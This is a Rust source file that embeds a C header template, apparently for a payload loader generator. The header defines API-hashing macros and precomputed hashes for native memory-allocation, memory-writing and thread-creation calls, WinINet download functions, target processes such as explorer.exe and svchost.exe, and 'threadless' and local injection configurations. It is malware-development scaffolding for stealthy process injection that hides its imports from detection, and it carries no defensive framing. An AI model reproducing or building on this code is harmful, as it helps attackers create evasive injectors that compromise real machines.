pub const MACROS_H: &str = r#"#pragma once
#include <windows.h>

#undef malloc
#define malloc(x) HeapAlloc(GetProcessHeap(), 0, x)
#undef realloc
#define realloc(x, s) HeapReAlloc(GetProcessHeap(), 0, x, s)
#undef free
#define free(x) HeapFree(GetProcessHeap(), 0, x)

void *mini_memset(void *dest, char c, unsigned int len);
void *mini_memcpy(void *dest, void *src, unsigned int len);
#undef memset
#define memset mini_memset
#undef _memcpy
#define _memcpy mini_memcpy
#undef memcpy
#define memcpy mini_memcpy

#define NtCurrentThread() ((HANDLE)(LONG_PTR) - 2)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR) - 1)

#define CALL(func_ptr, ...) ((func_ptr)(__VA_ARGS__))

int strcmpw(_In_ LPCWSTR s1, _In_ LPCWSTR s2);
int strcmpa(_In_ LPCSTR s1, _In_ LPCSTR s2);
SIZE_T strlena(_In_ LPCSTR s1);
SIZE_T strlenw(_In_ LPCWSTR s1);
CHAR UpperChar(CHAR C);

#define STRCMPA(s1, s2) (strcmpa((LPCSTR)s1, (LPCSTR)s2))
#define STRCMPW(s1, s2) (strcmpw((LPCWSTR)s1, (LPCWSTR)s2))
#define STRLENA(s1) (strlena((LPCSTR)s1));
#define STRLENW(s1) (strlenw((LPCWSTR)s1));

#define B_PTR(x) ((PBYTE)(x))
#define S_PTR(t, s) ((t *)&(s))

#define HASH_SEED 6
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);

#define HASHA(STR) HashStringJenkinsOneAtATime32BitA((char *)STR)
#define HASHW(STR) HashStringJenkinsOneAtATime32BitW((wchar_t *)STR)

/* Printf Function define */
#ifdef DEBUG
#define PRINTA(STR, ...)                                                       \
    if (1) {                                                                   \
        LPSTR buf =                                                            \
            (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);        \
        if (buf != NULL) {                                                     \
            int len = wsprintfA(buf, STR, ##__VA_ARGS__);                      \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buf, len, NULL,     \
                          NULL);                                               \
            HeapFree(GetProcessHeap(), 0, buf);                                \
        }                                                                      \
    }
#endif

/* Api HASH */
#define NtAllocateVirtualMemory_Hash 0x00000000863e2804
#define NtWriteVirtualMemory_Hash 0x00000000c58cb937
#define NtCreateThreadEx_Hash 0x0000000062eaee5b
#define NtProtectVirtualMemory_Hash 0x0000000076529ced
#define NtWaitForSingleObject_Hash 0x00000000e97d9d9f
#define NtWriteVirtualMemory_Hash 0x00000000c58cb937
#define TpAllocWork_Hash 0xab9e0f9f
#define TpPostWork_Hash 0xa721b155
#define TpReleaseWork_Hash 0x867011aa
#define NtQuerySystemInformation_Hash 0xa4a0268a
#define OpenProcess_Hash 0x1bceb9af

/* DLL HASH */
#define NTDLL_DLL_HASH 0xd3b17609
#define WININET_DLL_HASH 0x0d02f9fd
#define MSVCRT_DLL_HASH 0x93442cb3
#define KERNEL32_DLL_HASH 0xd4d19933
#define MALLOC_HASH 0xd629dd68
#define STRCMP_HASH 0x6165151c
#define LOADLIBRARYA_HASH 0x0fa9b202
#define INTERNETOPENA_HASH 0x88d1e655
#define INTERNETOPENURLA_HASH 0xc9036bc1
#define INTERNETREADFILE_HASH 0x58a95ea8
#define INTERNETCLOSEHANDLE_HASH 0xa477fa94
#define WAITFORSINGLEOBJECT_HASH 0x6c0ec586


/* Process Hash */
#define RUNTIMEBROKER_EXE_HASH 0x79262114
#define SVCHOSTS_EXE_HASH 0xf80eacd4

/* Threadless Function Config Hash */
/* Config 1 */
#define NtCreateWnfStateName_Hash 0xfa5c087f
#define NtWaitForMultipleObjects_Hash 0x3d8d0b0d

/* Config 3 */
#define EXPLORER_EXE_HASH 0xa587da29
#define NtQueryKey_Hash 0x7dd5c7d2

/* Config 4*/
#define USER32_DLL_HASH 0x61cbde37
#define RtlSetLastWin32Error_Hash 0xeb8e9e01 // this will stop explorer.exe

/* Config test */
#define NtClearEvent_Hash 0xa6057423
#define RtlReleaseSRWLockExclusive_Hash 0xe35096bf
#define RtlNtStatusToDosError_Hash 0x513adfae
#define LdrUnloadDll_Hash 0xa411b10d

/* local injection */
#define RtlAcquireSRWLockExclusive_Hash 0xabcf0718

"#;